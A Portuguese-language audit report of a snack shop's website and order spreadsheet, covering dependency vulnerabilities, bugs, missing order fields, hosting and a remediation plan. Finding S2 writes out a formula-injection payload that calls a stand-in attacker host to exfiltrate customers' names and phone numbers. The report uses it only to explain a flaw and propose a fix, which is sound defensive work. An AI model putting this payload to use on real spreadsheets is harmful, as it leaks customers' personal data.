# Auditoria Don Enrico Lanches — 25/09/2026

Auditoria feita do ponto de vista de quem contratou o site e está recebendo a entrega.
Base auditada: `main` @ `9660885` (PR #20), que é o que está no ar.

---

## 1. Veredito

**Como vitrine, o site está pronto. Como ferramenta de venda, ainda não.** A engenharia é
boa e bem acima da média para um site desse porte. O problema está no que *não* foi feito:
o pedido que chega no WhatsApp continua incompleto, a planilha de operação nunca entrou em
funcionamento e o dono depende de um programador até para trocar um preço.

O dia a dia hoje é: o cliente monta o carrinho, a mensagem chega com itens e total, e o dono
**ainda precisa perguntar** nome, data, horário, endereço, entrega ou retirada e forma de
pagamento. Ou seja, a dor que o site prometia resolver ("o pedido se perde no WhatsApp")
foi resolvida só pela metade.

| Área | Nota | Resumo |
|---|---|---|
| Qualidade de código / testes | Boa | Lint, TypeScript e 5 suítes passam; teste de navegador cobre teclado, contraste e sem JS |
| Visual / acessibilidade | Boa | Sem overflow em 375–1440, foco visível, contraste AA. Tem 1 falha real (título sem JS) |
| Performance | Boa | 218 KB de JS, LCP ~1 s (CPU 4x lenta), CLS 0 |
| Segurança | **Fraca** | Next.js com CVE crítica, injeção de fórmula na planilha, sem cabeçalhos de segurança |
| Requisitos funcionais | **Incompleto** | Faltam dados essenciais do pedido; taxa de entrega, pagamento e planilha não estão em uso |
| Operação pelo dono | **Fraca** | Preço e cardápio só mudam com código + deploy; não dá para pausar pedidos |
| Infra / hospedagem | Confusa | O site está no ar em **dois** lugares (GitHub Pages e Vercel), sem domínio próprio |

---

## 2. O que eu verifiquei (e o que ficou de fora)

**Rodei:** `npm install`, `npm audit`, `npm run lint`, `tsc --noEmit`, build normal e build
do GitHub Pages, `check:planilha` (299 ok), `check:pix` (29 ok), `check:midia`,
`check:cerebro`, `check:export`, a suíte de navegador `npm run check` (dev e produção),
capturas em 375 px com rolagem, teste com JavaScript desligado, e um code review nível
*high* de `src/` e `apps-script/`, com os achados principais conferidos na mão.

**Vercel (projeto `don-enrico-`, time `me-98e0`):** configuração, domínios, deploys,
variáveis de ambiente, erros de runtime dos últimos 7 dias e cabeçalhos HTTP da produção.

**Não consegui:**
- Abrir `kumiechikc.github.io/DON-ENRICO-` direto, porque a rede do ambiente bloqueia. A
  Vercel eu li pela API dela.
- Testar a planilha dentro do Google Sheets, porque ela não está instalada. Os achados
  dela vêm da leitura do código e dos testes em Node.

---

## 3. Segurança

### 🔴 S1. Next.js 16.2.12 com vulnerabilidade crítica (e `sharp`/`postcss` altas)
`npm audit` aponta RCE na Image Optimization API (GHSA-2xp9-vwfh-vxw4), além de
`sharp <=0.35.4` e `postcss <=8.5.22`. No GitHub Pages o site é estático e o risco é
baixo. **Na Vercel roda um servidor Next de verdade**, e lá a exposição existe.
**Correção:** subir para `next@16.3.6` (e `eslint-config-next` junto), rodar build e checks.

### 🔴 S2. Injeção de fórmula na planilha (`apps-script/WebApp.gs:67`)
O endpoint é anônimo (`ANYONE_ANONYMOUS`) e o token vai visível no JavaScript do site. Os
campos `cliente` e `telefone` vão para a planilha via `setValue` e passam só por
`textoLimpo`, que não trata `=`. Um POST com
`"cliente": "=IMPORTDATA(\"https://atacante/?\"&TEXTJOIN(\",\",1,Pedidos!E:F))"` vira
fórmula viva. Quando o dono abre a planilha, **nome e telefone de todos os clientes vazam**,
o que é incidente de LGPD. O site nem envia esses campos, então dá para simplesmente
parar de aceitá-los.
**Correção:** ignorar `cliente`/`telefone` vindos do site, ou prefixar com `'` todo valor
que comece com `= + - @`.

### 🟠 S3. Token "público" e sem limite de envios
O próprio código admite que o token não é segurança. Hoje o estrago possível é encher a
aba Pedidos de lixo, porque não há limite de taxa. Isso só tem conserto de verdade com um
intermediário no servidor: uma rota `/api/pedido` na Vercel que guarda o token em
segredo, limita envios por IP e repassa ao Apps Script. **É o melhor motivo técnico para
escolher a Vercel como hospedagem única** (ver I1).

### 🟠 S4. Sem cabeçalhos de segurança na produção da Vercel
Tem HSTS e mais nada: faltam CSP, `X-Frame-Options`/`frame-ancestors`,
`Referrer-Policy` e `Permissions-Policy`. O site pode ser embutido em iframe por qualquer
um (clickjacking do botão de WhatsApp). **Correção:** um `headers()` no `next.config.ts`
(não funciona no GitHub Pages, que não aceita cabeçalho customizado; mais um ponto para
a Vercel).

### 🟡 S5. Builds não reproduzíveis
O `package-lock.json` está no `.gitignore`. Cada CI e cada deploy instala versões
diferentes (`^` em tudo, exceto `next`). É risco de cadeia de suprimentos e de "quebrou
sozinho". **Correção:** commitar o lockfile e usar `npm ci`.

### 🟡 S6. Ambiente de desenvolvimento permissivo
`.mcp.json` roda 5 pacotes `npx ...@latest` com `enableAllProjectMcpServers: true`, e o
`settings.json` libera `Read(//home/**)`. Um PR que altere o `.mcp.json` executa código
arbitrário na máquina de quem abrir o projeto. **Correção:** fixar versões e tirar o
auto-aprovar.

### 🟡 S7. Previews da Vercel públicos
Todo branch gera URL pública (`ssoProtection: null`). Como o conteúdo é público, o
impacto é baixo, mas rascunhos (preço errado, texto não aprovado) ficam acessíveis e
indexáveis. **Correção:** ligar Vercel Authentication para Preview.

---

## 4. Bugs (code review, conferidos)

| # | Gravidade | Onde | Problema | Conferido |
|---|---|---|---|---|
| B1 | 🔴 | `cart-drawer.tsx:31` | O código do pedido (`#A7K2`) é sorteado **uma vez por carregamento de página**, não por pedido. O `CartDrawer` fica montado o tempo todo. Se o cliente mandar um pedido, limpar e mandar outro, vai o mesmo código, e a planilha descarta o segundo como "repetido" | Sim, lendo o código |
| B2 | 🔴 | `WebApp.gs:52` | A checagem de código repetido roda **fora da trava**. Um clique duplo manda 2 beacons simultâneos, e os dois passam, gerando pedido duplicado. É exatamente o caso que o comentário diz tratar | Sim |
| B3 | 🟠 | `cart-context.tsx:88` | O preço salvo no `localStorage` é reaproveitado sem conferir com o `menu.ts`. Se o preço mudar, o cliente que volta **manda o preço antigo no WhatsApp**, enquanto a planilha registra o novo. Dá briga de valor com cliente | Sim |
| B4 | 🟠 | `hero-section.tsx:162` | O `<h1>` "Salgados para festa" tem `opacity-0` sem `data-reveal`. **Sem JS, ou com JS lento, o título principal fica invisível.** A suíte `no-js` não pega porque só olha `[data-reveal]` | Sim, medi `opacity: 0` com JS desligado |
| B5 | 🟠 | `Instalar.gs:404` | O faturamento do mês filtra `<= EOMONTH(...)`, que é meia-noite do último dia. Entrega marcada no último dia do mês com hora **some do relatório** do mês | Sim |
| B6 | 🟠 | `Estoque.gs:249` | "Refazer estoque" num pedido Entregue→Cancelado apaga a Venda e não repõe nada. O estoque sobe sem registro | Sim |
| B7 | 🟠 | `Pedidos.gs:137` | `onEdit` ignora edição de várias linhas. Arrastar "Confirmado" para 3 pedidos **não reserva estoque**, e a planilha passa a vender o que já está prometido | Sim |
| B8 | 🟡 | `Nucleo.gs` + `registro.ts` | Deduplicação por código olha **todos os pedidos da história**. Com o tempo, uma colisão aleatória (4 caracteres, 810 mil combinações) descarta em silêncio um pedido legítimo. Com ~1.300 pedidos já se espera 1 perdido | Cálculo |
| B9 | 🟡 | `intro-curtain.tsx:36` | `curtain.remove()` em nó do React. Se o usuário ligar "reduzir movimento" com a página aberta, sai `NotFoundError` | Plausível |
| B10 | 🟡 | `cinema-loop.tsx:180` | O vídeo com `autoPlay` começa 200 px antes de aparecer na tela e chega pela metade | Plausível |
| B11 | 🟡 | carrinho | Sem limite de quantidade. O cliente pode pedir 999 pacotes, e a planilha corta em 200 e descarta o item | Sim |

B1, B2 e B8 só acontecem com a planilha ligada, **que hoje não está**. Mesmo assim, têm
que ser corrigidos antes de ligar.

---

## 5. Requisitos funcionais: vai funcionar no dia a dia?

### O que funciona
- Cardápio com linhas, faixas e regra de sabores confirmada pelo sócio
- Carrinho persistente, mensagem de WhatsApp com itens, sabores, total e código
- Box sortido tratado certo (sem escolha de sabor)
- Site funciona sem JS (exceto o título, ver B4), bom em celular, acessível
- SEO básico: título, descrição, Open Graph, JSON-LD, sitemap, robots

### O que falta para o pedido chegar completo (o requisito central)
| Falta | Por que importa |
|---|---|
| **Data e horário da festa/entrega** | Negócio com antecedência mínima de 24 h que não pergunta a data. É a primeira pergunta que o dono vai fazer em todo pedido |
| **Entrega ou retirada + bairro/cidade** | Define a taxa e se atende a região |
| **Nome do cliente** | A planilha registra pedido anônimo |
| **Taxa de entrega** | O "Total" mostrado não é o total. O cliente vê R$ 69,90 e depois ouve outro valor. Isso gera atrito e desistência |
| **Forma de pagamento** | Nem decidida ainda ("a pensar") |
| **Validação da antecedência** | Nada impede pedido para "hoje à noite" sem aviso |
| **Pedido mínimo/máximo** | A cozinha não tem teto declarado |

Nada disso exige backend: são 3 a 4 campos no carrinho que entram na mensagem. **É o item
de maior retorno do projeto inteiro e não foi feito**, enquanto foram feitos vídeo em loop,
shader de calor no hero, cursor magnético e cortina de abertura.

### O que falta para o dono operar sozinho
- **Trocar preço ou tirar item do cardápio** exige editar `menu.ts`, regerar o
  `Catalogo.gs`, commitar e esperar o CI. Para uma lanchonete isso é inviável no longo
  prazo. O `ARQUITETURA-BACKEND.md` prevê "cardápio editável pela planilha", mas está só no
  papel.
- **Pausar pedidos** (férias, cozinha lotada no sábado): não existe.
- **Planilha de operação:** pronta, testada e **nunca instalada**. As variáveis
  `NEXT_PUBLIC_REGISTRO_URL/TOKEN` não existem nem no workflow do Pages nem na Vercel
  (conferi: 0 variáveis). Então o registro automático está desligado em produção.
- **Medição:** zero analytics. Não dá para saber quantas pessoas abrem o carrinho,
  quantas clicam em "Enviar pelo WhatsApp" ou de onde vêm. Sem isso ninguém prova se o
  site vende.

### Conteúdo
- 3 de 5 linhas **sem foto** (Assados, Folhados, Seleção)
- **Sem logo**: o nome está escrito em tipografia
- Sem endereço e horário, portanto sem Google Meu Negócio, que para "salgados para festa
  Viamão" vale mais que o site
- "Máximo dois sabores por cento" aparece embaixo da faixa de **50** unidades. "Por cento"
  lido fora de contexto parece porcentagem. Melhor escrever "até 2 sabores"

---

## 6. Vercel e hospedagem

| Item | Estado |
|---|---|
| Projeto | `don-enrico-` (Next.js, Node 24.x) |
| Produção | `don-enrico.vercel.app`, deploy `dpl_BvcQwg…` do `main` @ `9660885`, READY |
| Erros de runtime (7 dias) | Nenhum |
| Variáveis de ambiente | **Nenhuma** |
| Domínio próprio | **Nenhum** |
| Proteção de preview | Desligada |
| Cabeçalhos | Só HSTS |

### 🔴 I1. O site está publicado duas vezes
O README diz que o site no ar é o GitHub Pages. A Vercel **também** publica produção a
cada merge no `main`, com o `canonical` apontando para o github.io. São dois sites, dois
builds (um com `basePath`, outro sem) e duas superfícies de ataque, e o dono nem sabe qual
divulgar.

**Recomendação: ficar só com a Vercel.** Ela permite cabeçalhos de segurança (S4), rota de
API com segredo e limite de envios (S3), imagem otimizada, analytics e domínio próprio com
um clique. O GitHub Pages não faz nada disso. Depois de migrar, desligar o
`deploy-pages.yml`, apontar `site.url` para o domínio novo e remover o `basePath`.

### 🟠 I2. Sem domínio próprio
`kumiechikc.github.io/DON-ENRICO-` (com o hífen no fim) passa ar de amador, é difícil de
ditar por telefone e fica preso à conta pessoal de quem desenvolveu. Um `.com.br` custa
cerca de R$ 40 por ano no registro.br e **deve estar no nome da empresa, não do
desenvolvedor**.

### 🟡 I3. Imagem de preview no WhatsApp (provável)
No export estático, a imagem OG sai como `out/opengraph-image`, **sem extensão**. O GitHub
Pages serve arquivo sem extensão como `application/octet-stream`, e o WhatsApp tende a
ignorar isso. Resultado: o link compartilhado sem imagem, justo no canal de venda. Não
consegui testar direto (rede bloqueada), mas isso some sozinho migrando para a Vercel.

---

## 7. Crítica ao processo (a parte que ninguém gosta de ouvir)

- **Energia no lugar errado.** O repositório tem `cerebro/`, `BECOS.md`,
  `CONTEXTO-COMPLETO.md` (52 KB), 13 skills de design (8,5 MB) e uma cópia duplicada do
  `ui-ux-pro-max` dentro de `src/` (1,9 MB de Python num app Next). Os commits são
  ensaios: cerca de 14 mil palavras em 76 commits. Enquanto isso, **data da entrega e taxa
  não estão no pedido**. A documentação é boa, mas o trabalho está desproporcional ao que
  gera venda.
- **O site é caro de manter.** GSAP, Lenis, shader WebGL, cursor magnético, cortina,
  vídeos e sequência de quadros é muito movimento para um cardápio. Cada item é mais uma
  coisa para quebrar (B9, B10) e para o próximo desenvolvedor entender.
- **Dependência do desenvolvedor.** Hoje, sem alguém que saiba Git e Next.js, o dono não
  muda nem um preço. Isso precisa entrar no contrato ou ser resolvido (Fase 2).
- **Muito do que está "travado" depende do dono, não do código.** O `TRAVADO.md` tem 10
  pendências. Enquanto não houver prazo e um responsável cobrando, o site não sai do
  estado de "quase pronto".

---

## 8. Plano

### Fase 0 — Esta semana (segurança e bugs que custam dinheiro)
1. [ ] Atualizar `next` → 16.3.6 e `eslint-config-next`; rodar lint, build e `npm run check` (S1)
2. [ ] Commitar `package-lock.json`, trocar `npm install` por `npm ci` nos workflows (S5)
3. [ ] `WebApp.gs`: descartar `cliente`/`telefone` vindos do site, ou escapar `= + - @` (S2)
4. [ ] `WebApp.gs`: mover a checagem de código repetido para dentro do `comTrava` (B2)
5. [ ] Deduplicar só em janela curta (ex.: mesmo código nas últimas 2 h) (B8)
6. [ ] `cart-drawer`: sortear novo código ao limpar o carrinho ou depois de enviar (B1)
7. [ ] `cart-context`: reidratar preço e nome pelo SKU do `menu.ts` e descartar itens que saíram do cardápio (B3)
8. [ ] Hero: título visível sem JS (`data-reveal` ou regra no `<noscript>`) e estender o check `no-js` para qualquer `opacity:0` (B4)
9. [ ] Limite de pacotes no carrinho igual ao da planilha (B11)

### Fase 1 — Pedido completo (o requisito que falta)
10. [ ] Campos no carrinho: **nome**, **data e horário**, **entrega/retirada**, **bairro/cidade**, **observação**
11. [ ] Validar a antecedência de 24 h e, abaixo disso, mostrar o aviso "a gente avalia" (sem bloquear)
12. [ ] Tudo isso na mensagem do WhatsApp e no registro da planilha
13. [ ] Mostrar "Total dos produtos · taxa de entrega a combinar" até a taxa ser definida
14. [ ] Trocar "Máximo dois sabores por cento" por "Até 2 sabores" na faixa de 50

### Fase 2 — Infra e operação
15. [ ] Decidir: **só Vercel**. Desligar `deploy-pages.yml`, remover `basePath`, atualizar `site.url` (I1)
16. [ ] Registrar domínio `.com.br` **no CNPJ/CPF do dono** e apontar na Vercel (I2)
17. [ ] Cabeçalhos de segurança no `next.config.ts` (S4) e proteção de Preview (S7)
18. [ ] Rota `/api/pedido` na Vercel: token secreto em variável de ambiente, limite por IP e repasse ao Apps Script (S3)
19. [ ] Instalar a planilha, configurar as variáveis, testar pedido real de ponta a ponta
20. [ ] Corrigir B5, B6 e B7 **antes** de o dono começar a usar a planilha
21. [ ] Vercel Web Analytics e evento no clique "Enviar pelo WhatsApp"
22. [ ] Interruptor "pedidos pausados" (variável de ambiente ou célula na planilha)
23. [ ] Cardápio e preço editáveis pela planilha (o que o `ARQUITETURA-BACKEND.md` já descreve), para tirar o dono da dependência do programador

### Fase 3 — Conteúdo e presença (depende do dono)
24. [ ] Fotos das 3 linhas que faltam, e os **originais** das 5 que vieram pelo WhatsApp
25. [ ] Logo em vetor e a "ponte" visual caixa ↔ site
26. [ ] Lista de cidades, taxa de entrega, endereço de retirada, horário
27. [ ] Criar o **Google Meu Negócio** (vale mais que o site para busca local)
28. [ ] Modelo de pagamento; depois disso, ligar o Pix (já implementado)
29. [ ] Aviso de privacidade simples (LGPD): o que é coletado, onde fica e como pedir exclusão

### Fase 4 — Higiene (quando sobrar tempo)
30. [ ] Fixar versões no `.mcp.json` e tirar `enableAllProjectMcpServers` (S6)
31. [ ] Remover `src/ui-ux-pro-max` duplicado de dentro do app
32. [ ] Reavaliar o custo de cada efeito (cortina, cursor, shader, sequência) contra a manutenção
33. [ ] Corrigir B9 e B10

### Critério de "entregue" (o que eu exigiria como contratante)
- Um pedido real feito do celular chega no WhatsApp **com data, local, nome e sabores** e
  aparece na planilha com o mesmo código, sem duplicar
- O dono troca um preço sozinho, sem abrir código
- Um domínio próprio, no nome da empresa, e um lugar só onde o site está publicado
- `npm audit` sem crítico ou alto em dependência de produção
- Checklist da Fase 3 com resposta do dono, ou item removido do site de propósito
